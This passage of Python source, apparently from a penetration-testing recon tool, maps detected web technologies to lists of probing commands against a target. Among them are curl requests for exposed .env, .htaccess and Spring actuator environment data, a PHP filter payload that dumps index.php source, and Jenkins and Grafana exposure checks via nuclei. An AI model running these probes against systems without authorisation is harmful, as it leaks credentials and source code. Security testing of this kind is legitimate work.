            f"curl -sk https://{target}/.htaccess",
        ],
        "php": [
            f"nuclei -u https://{target} -t vulnerabilities/php/",
            f"curl -sk 'https://{target}/?file=php://filter/convert.base64-encode/resource=index.php' | base64 -d",
        ],
        "laravel": [
            f"curl -sk https://{target}/.env",
            f"nuclei -u https://{target} -t exposures/configs/laravel-env.yaml",
        ],
        "spring": [
            f"curl -sk https://{target}/actuator",
            f"curl -sk https://{target}/actuator/env | python3 -m json.tool",
            f"nuclei -u https://{target} -t vulnerabilities/spring/",
        ],
        "jenkins": [
            f"curl -sk https://{target}/jenkins/script",
            f"nuclei -u https://{target} -t exposures/jenkins.yaml",
        ],
        "grafana": [
            f"curl -sk https://{target}/api/users -H 'Authorization: Bearer' ",
            f"nuclei -u https://{target} -t vulnerabilities/other/grafana-auth-bypass.yaml",
        ],
    }
    for key, cmds in mapping.items():
        if key in tech_lower:
            return cmds
    return []
